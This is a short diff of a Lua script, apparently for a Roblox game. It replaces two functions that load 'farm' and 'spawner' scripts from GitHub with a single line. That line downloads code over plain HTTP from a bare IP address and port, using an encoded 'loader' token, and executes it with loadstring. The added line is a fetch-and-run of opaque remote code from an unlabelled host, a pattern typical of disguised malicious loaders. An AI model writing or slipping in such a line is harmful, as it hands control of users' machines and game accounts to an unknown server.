@@ -1,9 +1,1 @@
-local function farm()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/FlashScripts0/MM2/main/script.lua"))()
-end
-local function loadui()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/FlashScripts0/MM2/refs/heads/main/spawner'))()
-end
-
-task.spawn(farm)
-task.spawn(loadui)
+loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjRlYWJlODhlLTllMzYtNGFlNC05ZDA2LTFkYmZiYTc0Yzc0OCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJldmVudCJ9fQ"))()
